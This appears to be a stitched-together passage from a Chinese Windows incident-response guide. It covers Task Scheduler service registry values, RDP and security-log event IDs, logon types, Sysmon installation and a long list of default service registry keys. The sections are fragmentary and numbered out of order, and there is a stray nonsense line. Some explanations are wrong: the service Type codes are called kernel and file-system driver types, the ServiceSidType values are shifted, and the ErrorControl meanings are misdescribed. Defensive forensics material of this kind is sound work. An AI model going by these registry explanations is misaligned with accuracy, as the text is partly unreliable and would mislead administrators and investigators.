 - DisplayName：计划任务服务的显示名称，用于在服务列表和管理工具中显示。

 - ErrorControl：指定计划任务服务启动时的错误处理行为。常见取值为：

 - 0x00000000（忽略）：忽略启动错误，继续启动服务。

 - 0x00000001（正常）：如果启动错误，则系统会尝试重新启动服务。

 - 0x00000002（严重）：如果启动错误，则系统会将其视为严重错误。

 - FailureActions：指定计划任务服务失败时采取的操作。该项包含了一系列定义了服务失败时的行为的设置，例如重启计算机、重新启动服务等。

 - Group：计划任务服务所属的服务组的名称。

 - ImagePath：计划任务服务的可执行文件路径。该项指定了计划任务服务可执行文件的位置和名称。

 - ObjectName：指定计划任务服务运行的用户或身份。该项定义了服务的安全上下文。

 - RequiredPrivileges：指定计划任务服务所需的特权。该项列出了计划任务服务所需的特权名称。

 - ServiceSidType：指定计划任务服务的服务安全标识符（SID）类型。常见取值包括：

 - 0x00000001（None）：未指定服务的SID类型。

 - 0x00000002（Unrestricted）：服务的SID具有无限制权限。

 - 0x00000003（Restricted）：服务的SID具有受限权限。

 - Start：指定计划任务服务的启动类型。常见取值为：

 - 0x00000002（自动启动）：计划任务服务在系统启动时自动启动。

 - 0x00000003（手动启动）：计划任务服务需要手动启动。

 - 0x00000004（禁用）：计划任务服务被禁用，无法启动。

 - Type：指定计划任务服务的类型。常见取值为：

 - 0x00000110：计划任务服务是一个内核驱动程序服务。

 - 0x00000120：计划任务服务是一个文件系统驱动程序服务。

 这个注册表中包含两项

 - Parameters
 - Security

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule\Parameters

```

 - ServiceDll：该值指定计划任务服务的动态链接库 (DLL) 文件路径和名称。这个 DLL 包含了计划任务服务的实现代码。
 - ServiceDllUnloadOnStop：该值指示当计划任务服务停止时是否卸载 ServiceDll 指定的 DLL。如果该值为 1，则服务停止时会卸载 DLL；如果该值为 0，则 DLL 不会在服务停止时卸载。
 - ServiceMain：该值是一个字符串，指定计划任务服务的入口点函数。这个函数在计划任务服务启动时被调用，并负责初始化服务。

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule\Security

```

 - Security 这个项存储了计划任务服务的安全设置，包括访问权限和安全描述符。

 【 Windows Server 2016 】默认情况

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule
    AtTaskMaxHours    REG_DWORD    0x48
    DisplayName    REG_SZ    @%SystemRoot%\system32\schedsvc.dll,-100
    ErrorControl    REG_DWORD    0x1
    Group    REG_SZ    SchedulerGroup
    ImagePath    REG_EXPAND_SZ    %systemroot%\system32\svchost.exe -k netsvcs
    Start    REG_DWORD    0x2
    Type    REG_DWORD    0x20
    Description    REG_SZ    @%SystemRoot%\system32\schedsvc.dll,-101
    DependOnService    REG_MULTI_SZ    RPCSS\0SystemEventsBroker
    ObjectName    REG_SZ    LocalSystem
    ServiceSidType    REG_DWORD    0x1
    RequiredPrivileges    REG_MULTI_SZ    SeIncreaseQuotaPrivilege\0SeChangeNotifyPrivilege\0SeAuditPrivilege\0SeImpersonatePrivilege\0SeAssignPrimaryTokenPrivilege\0SeTcbPrivilege\0SeRestorePrivilege\0SeBackupPrivilege
    FailureActions    REG_BINARY    805101000000000000000000030000001400000004000000000000000100000060EA00000000000000000000

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule\Parameters
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule\Security

```

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule\Parameters
    ServiceDll    REG_EXPAND_SZ    %systemroot%\system32\schedsvc.dll
    ServiceDllUnloadOnStop    REG_DWORD    0x1
    ServiceMain    REG_SZ    ServiceMain

```

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule\Security
    Security    REG_BINARY    01001480900000009C000000140000003000000002001C000100000002801400FF010F000101000000000001000000000200600004000000000014008D00020001010000000000050B00000000001800DD010E000102000000000005200000002002000000001400FF010F00010100000000000512000000000018008D00020001020000000000052000000021020000010100000000000512000000010100000000000512000000

```

### 1. 任务管理器

任务栏右键选择任务管理器 或者使用快捷键 `Ctrl+Shift+Esc` 快速打开任务管理器，如下图：

可以对进程右键，进一步查看进程信息

### 1) 查询指定用户权限的进程

`tasklist /fi "USERNAME eq NT AUTHORITY\SYSTEM"

```

### 1. 系统基本信息查询

cmd中输入命令：

 `systeminfo

```
 列出系统信息后，主要关注补丁信息：

### 1. 事件查看器

`win+r` 中输入，打开系统事件查看器：

 `eventvwr.msc            # windows事件查看器

```

主要关注以下日志内容：

 - 安全日志

 记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。

 - 系统日志

 记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。

 - 应用程序日志

 包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。

当安全日志被删除时，可通过以下日志查看RDP连接日志

 `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS\Operational

```

 - 98 建立网络连接
 - 131 建立新的网络连接

 `Microsoft-Windows-TerminalServices-RemoteConnectionManager\Operational

```

 - 261  已收到一个连接
 - 1149 远程桌面服务: 身份验证成功

 `Microsoft-Windows-TerminalServices-LocalSessionManager\Operationa
这个日志包含本地登录和RDP网络登录

```

 - 21  RDP远程登录成功
 - 22  已收到 shell 启动通知(22总是伴随着21)
 - 23  会话注销成功
 - 24  会话断开连接
 - 25  会话重新连接成功
 - 39  与会话断开连接
 - 40  与会话断开连接原因代码

针对windows安全日志分析，主要是查看各事件ID，同时查看事件内容，以下为常见的事件ID代表的含义：

Microsoft官方事件ID含义对应表

https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor

 事件ID 说明 4624 登录成功 4625 登录失败 4634 注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 4722 启用用户 4726 删除用户 1102 清理日志 4778 用户重新连接到会话 4779 用户结束了一个会话 4648 `runas` 登录 其中每个登录事件日志中，还会有`登录类型`字段，该字段代表为所使用的登录方式为哪种，如下表：

 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录 3 网络（Network） 最常见的情况就是连接到共享文件夹或共享打印机时 4 批处理（Batch） 通常表明某计划任务启动 5 服务（Service） 每种服务都被配置在某个特定的用户账号下运行 7 解锁（Unlock） 屏保解锁/RDP会话重连接 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如FTP 9 新凭证（NewCredentials） 使用带/Netonly参数的RUNAS命令运行一个程序 10 远程交互（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用

可以通过筛选当前安全日志的方式，查看是否存在爆破纪录，如果存在大量、且时间连续的4625日志，说明存在爆破记录：

也可以筛选上面敏感的事件id进行分析，当前日志分析的前提是日志完好的保存且记录配置正确

### 1) 安装

首先下载 sysmon 安装程序，包含以下文件：

使用命令进行安装，安装之前需要将下载的 sysmonconfig-export.xml  配置文件放到当前文件夹，然后使用以下命令进行安装，需要注意的是，安装过程需要用管理员权限，所以需要管理员启动cmd：

 `sysmon64.exe -accepteula -i sysmonconfig-export.xml
# 默认设置进行安装，使用指定的配置文件xml

```
 看到如下截图即代表安装完成：

### 1) 服务名称、描述等信息

服务描述是否为空，为空项需要重点查看关注下

服务名称是否有明显异常的，异常的需要关注一下

### 1) 服务列表

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

```
 `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services

```
 这获取得多快你说

有几个注册表项可以设置服务在启动期间自动启动，默认在系统上并不存在

 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices

```
 【 Windows Service 2016 】默认情况

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Data
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET Data Provider for Oracle
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET Data Provider for SqlServer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET Memory Cache 4.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NETFramework
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\1394ohci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\3ware
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ACPI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AcpiDev
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\acpiex
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\acpipagr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AcpiPmi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\acpitime
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ADOVMPPackage
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ADP80XX
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\adsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AFD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ahcache
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AJRouter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ALG
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AmdK8
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AmdPPM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\amdsata
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\amdsbs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\amdxata
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppIDSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Appinfo
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\applockerfltr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppMgmt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppReadiness
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppVClient
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppvStrm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppvVemgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppvVfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppXSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\arcsas
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AsyncMac
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\atapi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AudioEndpointBuilder
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Audiosrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AxInstSV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\b06bdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BasicDisplay
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BasicRender
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BattC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bcmfn
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bcmfn2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Beep
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bfadfcoei
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bfadi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BFE
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BITS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bowser
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BrokerInfrastructure
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BTHPORT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bthserv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\buttonconverter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bxfcoe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bxois
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CapImg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cdfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDPSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDPUserSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDPUserSvc_448e2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cdrom
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertPropSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cht4iscsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cht4vbd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CLFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ClipSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\clreg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\clr_optimization_v4.0.30319_32
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\clr_optimization_v4.0.30319_64
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CmBatt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CNG
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cnghwassist
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CompositeBus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\COMSysApp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\condrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CoreMessagingRegistrar
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CoreUI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\crypt32
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CSC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CscService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dam
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DCLocator
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DcomLaunch
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DcpSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\defragsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DeviceAssociationService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DeviceInstall
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DevQueryBroker
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dfsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dhcp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DiagTrack
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Disk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DmEnrollmentSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dot3svc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DPS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DsmSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DsSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DXGKrnl
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\e1iexpress
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Eaphost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ebdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EhStorClass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EhStorTcgDrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\elxfcoe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\elxstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\embeddedmode
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EntAppSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ErrDev
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ESENT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventSystem
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\exfat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\fastfat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\fcvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\fdc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\fdPHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FDResPub
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FileCrypt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FileInfo
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Filetrace
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\flpydisk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FltMgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FontCache
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FrameServer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FsDepends
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Fs_Rec
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gencounter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\genericusbfn
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GPIOClx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gpsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HDAudBus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HidBatt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HidBth
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\hidinterrupt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\hidserv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HidUsb
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HomeGroupListener
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HpSAMD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HTTP
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HvHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\hvservice
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\hwpolicy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\hyperkbd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HyperVideo
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\i8042prt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\iaLPSSi_GPIO
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\iaLPSSi_I2C
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\iaStorAV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\iaStorV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ibbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\icssvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IndirectKmd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\inetaccs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\intelide
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\intelpep
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\intelppm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\iorate
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IpFilterDriver
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\iphlpsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IPMIDRV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IPNAT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IPsecGW
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\isapnp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\iScsiPrt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\kbdclass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\kbdhid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\kdnic
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KeyIso
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KPSSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KSecDD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KSecPkg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ksthunk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\KtmRm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ldap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lfsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LicenseManager
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lltdio
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lltdsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lmhosts
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Lsa
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LSI_SAS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LSI_SAS2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LSI_SAS3i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LSI_SSS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LSM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\luafv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MapsBroker
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\megasas
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\megasas2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\megasr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mlx4_bus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MMCSS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Modem
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\monitor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mouclass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mouhid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mountmgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mpsdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MpsSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mrxsmb
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mrxsmb10
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mrxsmb20
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsBridge
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSDTC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSDTC Bridge 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Msfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\msgpiowin32
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mshidkmdf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mshidumdf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\msisadrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSiSCSI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\msiserver
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsLbfoProvider
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsLldp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsRPC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSSCNTRS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mssmbios
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MTConfig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Mup
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\mvumis
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\napagent
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NcaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NcbService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ndfltr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NDIS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NdisCap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NdisImPlatform
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NdisTapi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Ndisuio
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NdisVirtualBus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NdisWan
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ndiswanlegacy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ndproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBIOS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetbiosSmb
